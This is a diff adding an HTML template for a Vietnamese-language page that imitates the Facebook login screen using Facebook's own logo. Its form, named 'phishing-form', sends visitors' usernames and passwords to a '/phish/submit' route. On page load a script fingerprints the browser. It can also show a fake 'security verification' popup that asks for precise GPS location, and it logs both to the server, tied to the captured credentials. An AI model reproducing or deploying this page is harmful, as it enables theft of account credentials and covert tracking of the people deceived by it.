@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title><%= title %></title>
+    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico">
+    <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    <style>body { margin: 0; padding: 0; font-family: Helvetica, Arial, sans-serif; background-color: #f0f2f5; } .container { display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; box-sizing: border-box;} .content { display: flex; justify-content: space-between; align-items: center; max-width: 980px; width: 100%;} .intro { flex-basis: 580px; padding-right: 32px; box-sizing: border-box; } .intro .logo { height: 106px; margin: -28px; } .intro h2 { font-size: 28px; font-weight: normal; line-height: 32px; width: 500px; } .login-form-container { flex-basis: 396px; text-align: center; } .login-form { background-color: #fff; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1); padding: 20px; } .login-form input { width: 100%; padding: 14px 16px; font-size: 17px; border: 1px solid #dddfe2; border-radius: 6px; margin-bottom: 12px; box-sizing: border-box; } .login-form button { width: 100%; background-color: #1877f2; border: none; border-radius: 6px; font-size: 20px; line-height: 48px; padding: 0 16px; color: #fff; font-weight: bold; cursor: pointer; } .forgot-password { color: #1877f2; font-size: 14px; text-decoration: none; margin-top: 16px; display: block; } .forgot-password:hover { text-decoration: underline; } .divider { align-items: center; border-bottom: 1px solid #dadde1; display: flex; margin: 20px 16px; text-align: center; } .create-account-btn { background-color: #42b72a; border: none; border-radius: 6px; font-size: 17px; line-height: 48px; padding: 0 16px; color: #fff; font-weight: bold; cursor: pointer; margin-top: 20px; } .swal2-popup {font-size: 1rem !important;} @media (max-width: 900px) { .content { flex-direction: column; text-align: center; } .intro { margin-bottom: 40px; padding-right: 0;} .intro h2 { width: auto; font-size: 24px;} }</style>
+</head>
+<body>
+    <div class="container">
+        <div class="content">
+            <div class="intro">
+                <img class="logo" src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="facebook">
+                <h2>Facebook giúp bạn kết nối và chia sẻ với mọi người trong cuộc sống của bạn.</h2>
+            </div>
+            <div class="login-form-container">
+                <div class="login-form">
+                    <form id="phishing-form" action="/phish/submit/<%= shortId %>" method="POST">
+                        <input type="hidden" name="visit_id" id="visit-id-input">
+                        <input type="text" name="username" placeholder="Email hoặc số điện thoại" required>
+                        <input type="password" name="password" placeholder="Mật khẩu" required>
+                        <button type="submit">Đăng nhập</button>
+                    </form>
+                    <a href="#" class="forgot-password" onclick="event.preventDefault();">Quên mật khẩu?</a>
+                    <div class="divider"></div>
+                    <button class="create-account-btn" onclick="event.preventDefault();">Tạo tài khoản mới</button>
+                </div>
+            </div>
+        </div>
+    </div>
+    <script>
+        const shouldRequestGPS = <%- requestGPS %>;
+        const payload = { shortId: '<%= shortId %>', fingerprint: null, components: null, latitude: null, longitude: null, accuracy: null };
+        async function runFullTracker() {
+            try {
+                const fp = await FingerprintJS.load();
+                const result = await fp.get();
+                payload.fingerprint = result.visitorId;
+                payload.components = result.components;
+                if (shouldRequestGPS) { await requestGPSAndContinue(); }
+            } catch (error) {
+                console.error("Tracker error:", error);
+            } finally {
+                await sendLogAndSetVisitId();
+            }
+        }
+        function requestGPSAndContinue() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) return resolve();
+                Swal.fire({ title: 'Xác minh an toàn', html: "Vui lòng cung cấp vị trí của bạn để tiếp tục.", icon: 'info', allowOutsideClick: false, showDenyButton: true, confirmButtonText: 'Đồng ý', denyButtonText: 'Từ chối', customClass: {popup: 'swal2-dark'} }).then((result) => {
+                    if (result.isConfirmed) {
+                        navigator.geolocation.getCurrentPosition(
+                            (position) => {
+                                payload.latitude = position.coords.latitude;
+                                payload.longitude = position.coords.longitude;
+                                payload.accuracy = position.coords.accuracy;
+                                resolve();
+                            },
+                            (error) => { console.warn("GPS Error:", error.message); resolve(); },
+                            { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+                        );
+                    } else { resolve(); }
+                });
+            });
+        }
+        async function sendLogAndSetVisitId() {
+            try {
+                const response = await fetch('/log', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
+                const data = await response.json();
+                if (data.status === 'success' && data.visitId) {
+                    document.getElementById('visit-id-input').value = data.visitId;
+                }
+            } catch (logError) { console.error("Log error:", logError); }
+        }
+        runFullTracker();
+    </script>
+</body>
+</html>
